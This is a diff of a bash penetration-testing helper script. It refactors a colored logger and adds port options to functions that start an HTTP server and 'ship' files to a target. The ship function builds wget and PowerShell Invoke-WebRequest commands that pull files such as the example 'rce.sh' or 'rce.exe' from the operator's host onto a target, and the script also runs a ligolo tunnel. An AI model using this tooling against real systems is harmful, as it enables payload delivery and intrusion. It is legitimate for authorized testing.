@@ -24,47 +24,24 @@ function _log() {
     local text=""
     local underline=""
     local newline=1
-    local ansi_bold="\033[1m"
-    local ansi_underline="\033[4m"
     local ansi_reset="\033[0m"
-    local fg_black="\033[30m"
-    local fg_red="\033[31m"
-    local fg_green="\033[32m"
-    local fg_yellow="\033[33m"
-    local fg_blue="\033[34m"
-    local fg_magenta="\033[35m"
-    local fg_cyan="\033[36m"
-    local fg_white="\033[37m"
-    local bg_black="\033[40m"
-    local bg_red="\033[41m"
-    local bg_green="\033[42m"
-    local bg_yellow="\033[43m"
-    local bg_blue="\033[44m"
-    local bg_magenta="\033[45m"
-    local bg_cyan="\033[46m"
-    local bg_white="\033[47m"
 
     while [ "$1" ]; do
         case "$1" in
-            --bold)
-                bold=$ansi_bold
-                shift
-                ;;
-            -u|--underline)
-                underline=$ansi_underline
-                shift
-                ;;
+            --bold) bold="\033[1m" && shift ;;
+            -u|--underline) underline="\033[4m" && shift ;;
             -f|--foreground)
                 shift
                 case "$1" in
-                    black) fg_color=$fg_black ;;
-                    red) fg_color=$fg_red ;;
-                    green) fg_color=$fg_green ;;
-                    yellow) fg_color=$fg_yellow ;;
-                    blue) fg_color=$fg_blue ;;
-                    magenta) fg_color=$fg_magenta ;;
-                    cyan) fg_color=$fg_cyan ;;
-                    white) fg_color=$fg_white ;;
+                    black) fg_color="\033[30m" ;;
+                    red) fg_color="\033[31m" ;;
+                    green) fg_color="\033[32m" ;;
+                    yellow) fg_color="\033[33m" ;;
+                    blue) fg_color="\033[34m" ;;
+                    magenta) fg_color="\033[35m" ;;
+                    cyan) fg_color="\033[36m" ;;
+                    white) fg_color="\033[37m" ;;
+                    gray) fg_color="\033[90m" ;;
                     *) fg_color="" ;;
                 esac
                 shift
@@ -72,30 +49,22 @@ function _log() {
             -b|--background)
                 shift
                 case "$1" in
-                    black) bg_color=$bg_black ;;
-                    red) bg_color=$bg_red ;;
-                    green) bg_color=$bg_green ;;
-                    yellow) bg_color=$bg_yellow ;;
-                    blue) bg_color=$bg_blue ;;
-                    magenta) bg_color=$bg_magenta ;;
-                    cyan) bg_color=$bg_cyan ;;
-                    white) bg_color=$bg_white ;;
+                    black) bg_color="\033[40m" ;;
+                    red) bg_color="\033[41m" ;;
+                    green) bg_color="\033[42m" ;;
+                    yellow) bg_color="\033[43m" ;;
+                    blue) bg_color="\033[44m" ;;
+                    magenta) bg_color="\033[45m" ;;
+                    cyan) bg_color="\033[46m" ;;
+                    white) bg_color="\033[47m" ;;
+                    gray) bg_color="\033[100m" ;;
                     *) bg_color="" ;;
                 esac
                 shift
                 ;;
-            --no-color)
-                no_color=1
-                shift
-                ;;
-            -n|--no-newline)
-                newline=0
-                shift
-                ;;
-            *)
-                text="$1"
-                shift
-                ;;
+            --no-color) no_color=1 && shift ;;
+            -n|--no-newline) newline=0 && shift ;;
+            *) text="$1" && shift ;;
         esac
     done
 
@@ -127,34 +96,18 @@ function _check_logger_level() {
 # Usage: swiss_logger <level> <text>
 function swiss_logger() {
     case "$1" in
-        debug)
-            _check_logger_level "debug" && _log -f white "$@"
-            ;;
-        info)
-            _check_logger_level "info" && _log -f green "$@"
-            ;;
-        warn)
-            _check_logger_level "warn" && _log -f yellow "$@"
-            ;;
-        error)
-            _check_logger_level "error" && _log --bold -f red "$@"
-            ;;
-        prompt)
-            # prompt must be display in any given level
-            _check_logger_level "error" && _log -f green "$@"
-            ;;
-        hint)
-            _log -f cyan "$@"
-            ;;
-        alternative)
-            _log -f magenta "$@"
-            ;;
-        highlight)
-            _log --bold -f white -b red "$@"
-            ;;
-        *)
-            echo -n "$@"
-            ;;
+        debug) _check_logger_level "debug" && _log -f gray "$@" ;;
+        info) _check_logger_level "info" && _log -f green "$@" ;;
+        warn) _check_logger_level "warn" && _log -f yellow "$@" ;;
+        error) _check_logger_level "error" && _log --bold -f red "$@" ;;
+        # prompt must be display in any given level
+        prompt) _check_logger_level "error" && _log -f green "$@" ;;
+        hint) _log -f cyan "$@" ;;
+        important-instruction) _log --bold -f red "$@" ;;
+        warn-instruction) _log --bold -f yellow "$@" ;;
+        info-instruction) _log --bold -f green "$@" ;;
+        highlight) _log --bold -f white -b red "$@" ;;
+        *) echo -n "$@" ;;
     esac
 }
 
@@ -188,7 +141,7 @@ function _get_default_network_interface_ip() {
 #   - global_settings.disable_sys_custom_command_banner <boolean>: feature flag to disable the banner.
 # Usage: _override_cmd_banner
 function _override_cmd_banner() {
-    if [ "$disable_sys_custom_command_banner" = false ]; then
+    if [[ "$disable_sys_custom_command_banner" = false ]]; then
         swiss_logger highlight "[ custom command, for default, add the sign _ in front of the command ]\n";
     fi
 }
@@ -232,7 +185,8 @@ function _cmd_is_exist() {
 # TODO: extend to all functions.
 function _wrap() {
     for cmd in "$@"; do
-        swiss_logger info "[i] Executing Commnad: $cmd"
+        swiss_logger warn-instruction "[SWISS] Following commands are executed:"
+        swiss_logger important-instruction "$cmd"
         eval "$cmd"
     done
 }
@@ -243,9 +197,7 @@ function _wrap() {
 # Usage: _disable_auto_exploit_function
 function _disable_auto_exploit_function() {
     swiss_logger highlight "[ The function MAY considered as automatic exploitation. Make sure you read the scripts! ]"
-    if [ "$_swiss_disable_auto_exploit_function" = true ]; then
-        return 1
-    fi
+    [[ "$_swiss_disable_auto_exploit_function" = true ]] && return 1
 }
 
 # Description:
@@ -281,19 +233,21 @@ function i() {
 }
 
 # Description: one-liner to start services.
-# Usage: svc <service>
+# Usage: svc <service> [OPTIONS]
 # Arguments:
 #   - service: current support:
-#     + docker              start docker service
-#     + ftp                 start a ftp server
-#     + http                start a http server on port 80
-#     + smb                 start a smb server
-#     + ssh                 start sshd service
-#     + bloodhound          start BloodHound (v4.3.1)
-#     + bloodhound-ce       start BloodHound CE (v2.4.1)
-#     + ligolo              start ligolo-ng_agent (v0.6.2)
-#     + wsgi                start wsgid
-#     + python-venv         create a python virtual environment
+#     + docker          start docker service
+#     + ftp             start a ftp server
+#     + http            start a http server on port 80
+#     + smb             start a smb server
+#     + ssh             start sshd service
+#     + bloodhound      start BloodHound (v4.3.1)
+#     + bloodhound-ce   start BloodHound CE (v2.4.1)
+#     + ligolo          start ligolo-ng_agent (v0.6.2)
+#     + wsgi            start wsgid
+#     + python-venv     create a python virtual environment
+#   - Options
+#     + -p, --port PORTS    Ports used (http)
 # Configuration:
 #   - function.svc_wsgi.default_port <integer>: default is 443.
 # Example:
@@ -301,10 +255,7 @@ function i() {
 #   svc ftp  # to spawn a ftp server in the current directory
 function svc() {
     local service="$1"
-    if [[ -z "$service" ]]; then
-        _help
-        return 1
-    fi
+    [[ -z "$service" ]] && _help && return 1
 
     case "$service" in
         docker)
@@ -326,10 +277,14 @@ function svc() {
             python3 -m pyftpdlib -w -p 21
             ;;
         http)
+
+            local port="80"
+            [[ $2 == "-p" || $2 == "--port" ]] && port=$3
+
             swiss_logger info "[i] start http server"
-            swiss_logger warn "[w] python3 -m http.server 80"
+            swiss_logger warn "[w] python3 -m http.server $port"
             i
-            python3 -m http.server 80
+            python3 -m http.server $port
             ;;
         smb)
             swiss_logger info "[i] start smb server"
@@ -384,6 +339,7 @@ function svc() {
             swiss_logger warn "[w] ip route del 122.252.228.38/32               # removal after use"
             swiss_logger info "[i] start                                        # start the agent"
             swiss_logger info "[i] Add listener (e.g., for svc http): listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80 --tcp"
+            swiss_logger info "[i] Port Forwarding (access via 240.0.0.1): sudo ip route add 240.0.0.1/32 dev ligolo"
             # TODO: add to configuration
             local ligolo_agent_path="$swiss_utils/tunnel/ligolo-0.6.2/proxy"
             $ligolo_agent_path -selfcert -laddr 0.0.0.0:443
@@ -400,97 +356,69 @@ function svc() {
             python3 -m venv .venv
             source .venv/bin/activate
             ;;
-        *)
-            _help
-            return 1
-            ;;
+        *) _help && return 1 ;;
     esac
 }
 
 # Description: one-liner to ship files to the target machine. With no copy-paste needs.
-# Usage: ship [-t|--type <linux|windows>] [-a|--auto-host <boolean>] [-m, --mode <http|smb>] <filepath 1> [filepath 2] ...
+# Usage: ship [-h, --help] [-t|--type <linux|windows>] [-a|--auto-host <boolean>] [-m, --mode <http|smb>] [-p, --port PORT] <filepath 1> [filepath 2] ...
 # Arguments:
 #   -t, --type <type>: linux or windows (default: linux)
 #   -a, --auto-host <boolean>: auto-host the http server (default: true)
 #   -m, --mode <mode>: http or smb (default: http)
+#   -p, --port PORT: used port (current only support on http)
 #   filepath: the path to the file you want to ship. Support multiple files at a time.
 # Example:
 #   ship ./rce.sh
-#   ship -t windows ./rce.exe
+#   ship -t windows $windows_family
 #   ship -t windows -m smb ./rce.exe
 function ship() {
+    [[ $# -eq 0 || $1 == "-h" || $1 == "--help" ]] && _help && return 0
+
     local type="linux"
     local mode="http"
     local autoHost=true
     local filepaths=()
-    local all_cmds=""
-
-    _helper() {
-        swiss_logger info "Usage: ship [-t, --type linux|windows] [-a, --auto-host] [-m, --mode http|smb] <filepath>..."
-        return 1
-    }
+    local used_port="80"
+    # TODO: implement default output path
 
     while [[ $# -gt 0 ]]; do
         case $1 in
-            -t|--type)
-                type="$2"
-                shift 2
-                ;;
-            -a|--auto-host)
-                autoHost="$2"
-                shift 2
-                ;;
-            -h|--help)
-                _helper
-                return 0
-                ;;
-            -m|--mode)
-                mode="$2"
-                shift 2
-                ;;
-            *)
-                filepaths+=("$1")
-                shift
-                ;;
+            -t|--type) type="$2" && shift 2 ;;
+            -a|--auto-host) autoHost="$2" && shift 2 ;;
+            -m|--mode) mode="$2" && shift 2 ;;
+            -p|--port) used_port="$2" && shift 2 ;;
+            *) filepaths+=("$1") && shift ;;
         esac
     done
 
-    if [[ ${#filepaths[@]} -eq 0 ]]; then
-        swiss_logger error "[e] At least one filepath is required."
-        _helper
-        return 1
-    fi
+    [[ ${#filepaths[@]} -eq 0 ]] && swiss_logger error "[e] At least one filepath is required." && _help && return 1
 
     local all_cmds=""
 
     for filepath in "${filepaths[@]}"; do
-        if [[ ! -f "$filepath" ]]; then
-            swiss_logger error "[e] File '$filepath' does not exist."
-            return 1
-        fi
-
+        [[ ! -f "$filepath" ]] && swiss_logger error "[e] File '$filepath' does not exist." && return 1
+    
         local filename=$(basename "$filepath")
-        cp "$filepath" "./$filename" && swiss_logger info "[i] File '$filename' copied to current directory."
+        cp --update=none "$filepath" "./$filename" && swiss_logger info "[i] File '$filename' copied to current directory."
 
         local cmd
         if [[ "$type" == "linux" ]]; then
             if [[ "$mode" == "http" ]]; then
-                cmd="wget $(_get_default_network_interface_ip)/$filename"
+                cmd="wget $(_get_default_network_interface_ip):$used_port/$filename"
             else
-                swiss_logger error "[e] Currently Linux only support HTTP mode."
-                exit 1
+                swiss_logger error "[e] Currently Linux only support HTTP mode." && return 1
             fi
         elif [[ "$type" == "windows" ]]; then
             if [[ "$mode" == "smb" ]]; then
                 cmd="copy \\\\\\$(_get_default_network_interface_ip)\\\\smb\\\\$filename C:/ProgramData/$filename"
             elif [[ "$mode" == "http" ]]; then
-                cmd="powershell -c \"Invoke-WebRequest -Uri 'http://$(_get_default_network_interface_ip)/$filename' -OutFile C:/ProgramData/$filename\""
+                cmd="powershell -c \"Invoke-WebRequest -Uri 'http://$(_get_default_network_interface_ip):$used_port/$filename' -OutFile C:/ProgramData/$filename\""
             else
                 swiss_logger error "[e] unsupported type (smb|http)."
             fi
         else
-            log error "[e] Unknown type '$type'."
-            return 1
+            log error "[e] Unknown type '$type'." && return 1
         fi
 
         all_cmds+="$cmd"$'\n'
@@ -501,7 +429,7 @@ function ship() {
             if [[ "$mode" == "smb" ]]; then
                 svc smb
             elif [[ "$mode" == "http" ]]; then
-                svc http
+                svc http --port "$used_port"
             fi
         else
             swiss_logger warn "[w] Remember to host the web server on your own"
